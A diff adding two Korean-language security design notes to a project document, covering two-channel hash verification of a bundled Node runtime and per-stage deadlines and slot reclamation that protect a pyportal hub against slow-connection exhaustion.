+- **번들 런타임 · 외부 바이너리 해시는 두 채널로 대조한다 — 런타임 보안 하한은 별도 필드**(보안 잔여 11-27 G4 — Node 22.23.5 · `packaging/node-runtime.sha256` · `util/runtimeCheck.js` ·
+  회귀 `server/test/secResidual1127Runtime.test.js` 11개 · 웹 `rvE_runtimeBannerText` · 변이 40/40):
+  - 압축본은 같은 채널 SHASUMS(전송 손상)와 저장소 고정값(다른 채널 — PR 검토) **둘 다** 풀기 전에 대조한다(`build-package.sh` 의 `--node-tarball` · 온라인 분기, `build-collector-win.sh --node-zip`, release.yml Windows 받기 — fail-closed).
+    탈출구는 명시 플래그(`--node-sha256`)만 두고 환경 변수는 받지 않는다. 대상은 파일 이름이 아니라 **내용 해시**로 조회한다. 검증 버전 판정 줄은 `VERIFIED_NODE_VERSION` 변수 하나(숫자 리터럴 금지 — 시험 T3).
+  - 런타임 보안 하한(`RUNTIME_CONTRACT.securityFloor`)은 state 를 새로 만들지 않고 별도 필드 `belowSecurityFloor`(true · false · null)로 둔다 — 구버전 웹이 모르는 state 를 조용히 무시하지 않게(하위 호환).
+    false 를 '안전' 으로 표시하지 말고 침묵한다 · 사전 배포판(`-rc`)은 같은 숫자여도 미만 · 하한 숫자는 API 값(`contract.securityFloor`)에서 · 비관리자 문구에는 버전 숫자 없음 · 기동 · 수집은 막지 않는다.
+  - 새 22.x 보안 릴리스가 나오면 `releaseVersion` · `securityFloor` · `node-runtime.sha256`(SHASUMS256.txt.sig 의 GPG 서명 확인 — 사람 절차)을 함께 올리고 시험의 닻 3곳(T1 · T3 · rvE ①)도 같이 바꾼다
+    (불변조건 minVersion ≤ securityFloor ≤ releaseVersion). 버전 일치 시험은 정규식 꼴보다 '고정 목록 파일 안의 모든 x.y.z 를 허용 목록으로' 본다(굵은 글씨 · 괄호 · 어순 변형을 놓치지 않는다).
+  - ⚠ **포탈 자동 업그레이드는 Node 런타임을 바꾸지 않는다** — 오프라인 패키지 재설치(엣지는 중앙의 엣지 배포 재실행) · Windows 수집기 zip 으로만 바뀐다. 남긴 것(타협): 재설치 전 설치본은 하한 미만으로 계속 돈다
+    (업그레이드 번들에 런타임을 넣는 근본 해결은 서명 · 원자 교체 · 롤백 · root 권한 설계가 필요한 후속) · 중앙 함대 화면(CapacityAdvisor)에 엣지별 하한 판정 없음 · CI 에서 GPG 확인 없음 ·
+    uagmon electron@^33 · 웹 dev 전용 critical(vitest · tinypool) · high(vite). 구현 · 반증 단계는 22.23.5 바이너리 실행이 권한 검사에 막혀 그 판으로 서버 시험을 돌리지 못했다 — 첫 확인은 CI(setup-node 22.23.5).
+
+- **pyportal 허브 인바운드 수신은 단계마다 전체 시한 · 연결 자리는 스레드 전에**(보안 잔여 11-27 L12 — 불변조건 원문은 `pyportal/CLAUDE.md` '수신 단계 시한·연결 자리' · 회귀 `pyportal/tests/test_sec_residual_1127.py`):
+  소켓 시한은 recv · sendall 1회 단위라 전체 시한이 아니다 — 헤더 · 본문 · 응답 쓰기 모든 단계에 전체 시한을 건다(아웃바운드 v2.768 RequestDeadline 과 대칭). 시한 초과는 EOF 가 아니라 예외(EOF 를 '헤더 끝' 으로 읽는
+  v2.769 함정의 인바운드판) · 본문 시한은 선언한 Content-Length 가 아니라 **받은** 바이트로(1바이트 드립으로 74~300초 점유) · 응답 쓰기 시한은 '상대가 받았다고 확인한 바이트'(리눅스 TIOCOUTQ)로 ·
+  가득 찼을 때 즉시 거절하지 말고 accept 루프에서 유한 대기(재접속 공격에서 즉시 거절이면 정상 성공률 0~4%, FIFO 대기면 100% — 반증 실측) · 자리 되찾기는 '지금 단계' 가 아니라 **연결 단위 누계**(감쇠)로
+  (단계 경계마다 기준 시각이 새로 잡히면 기준 직전마다 갈아타는 연결이 영원히 후보가 되지 않는다 — 반증 2회차 R2-1 · 덮어쓴 단계도 누계에 — 3회차 R3-1 `Expect: 100-continue`) ·
+  요청을 마친 연결이 스스로 자리를 넘기게 하지 말 것(공격 중 정상 사용자만 끊겼다 — 반증 1회차 M1) · 보호 예외(로그인 세션)에는 주체당 개수 상한(계정당 2) ·
+  미인증 큰 본문(`HUB_PREAUTH_MAX_BODY`)은 읽기 전에 거절하고 연결을 닫는다('본문 일괄 drain' 의 예외 — 연결을 닫으므로 desync 없음).
+  남긴 것: 빠른 실제 요청을 reclaim_after 보다 자주 보내는 연결(운영 환산 64칸 ≈ 11 req/s 이상 — 추정) · 로그인 내부자(계정 여럿) · 여러 출발지 동시 공격 — 앞단 프록시 · 출발지 상한의 일 ·
+  stdlib 헤더 상한(연결당 약 6.5MB — 1회차 N-4, 범위 밖) · 운영 비율(10 · 10 · 5초 · 64칸) · 800ms RTT 정상 클라이언트 오인율 실측 없음(시험은 1/10 축소 비율).
